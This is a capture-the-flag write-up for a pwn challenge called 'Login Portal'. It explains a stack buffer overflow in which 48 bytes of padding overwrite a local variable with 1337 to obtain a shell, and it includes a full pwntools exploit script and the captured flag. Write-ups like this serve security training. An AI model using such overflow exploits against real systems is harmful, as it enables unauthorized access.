# Login Portal
>I dare you to login as admin ;)

![gambar](https://github.com/Valcar-ies/WriteUP-Seleksi-Internal-Gemastik-2023-Foresty/assets/84186470/06a95d19-be16-483d-b61a-975b8ce74207)

Given a binary file, and immediately check the binary
the protection

![gambar](https://github.com/Valcar-ies/WriteUP-Seleksi-Internal-Gemastik-2023-Foresty/assets/84186470/54a6728e-27dc-4216-a4a7-fba9f5d0d26e)

From the results it was found that there was no canary and also PIE
Next, do a static analysis first to check
its vulnerable. Decompile using ghidra. on function
main, called login_user.

![gambar](https://github.com/Valcar-ies/WriteUP-Seleksi-Internal-Gemastik-2023-Foresty/assets/84186470/b150bc04-00bc-47ff-927c-d7f590187619)

In line 12 it can be seen that there is a potential BOF, so
it looks like you just need to overwrite the value of the local_18 variable
becomes 0x539 or 1337. After successfully overwriting then
we managed to get the shell.

But keep in mind to do a stack overwrite is not necessary
perform BOF until it touches the Instruction Pointer. Just need to be precise
on the number of input buffers (48). So fill in the padding as much as 48
bytes, then enter the value 1337.

#### The solver used: 
```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

padding = 48

p = flat([
    asm('nop') * padding,
    1337
])

sh.sendlineafter(b':', p)
sh.interactive()
```

Then do a test locally : shell got

![gambar](https://github.com/Valcar-ies/WriteUP-Seleksi-Internal-Gemastik-2023-Foresty/assets/84186470/d3261eac-a2f4-4b5e-af52-4dd3e8beebe9)

Just send it to the remote server:

![gambar](https://github.com/Valcar-ies/WriteUP-Seleksi-Internal-Gemastik-2023-Foresty/assets/84186470/173e92d7-bfae-4ee4-a3e7-127f73547de9)

#### Flags successfully obtained:
```console
ForestyHC{admin_1337_here_is_your_crown_1fad32}
```

##### Solved by : valcaries
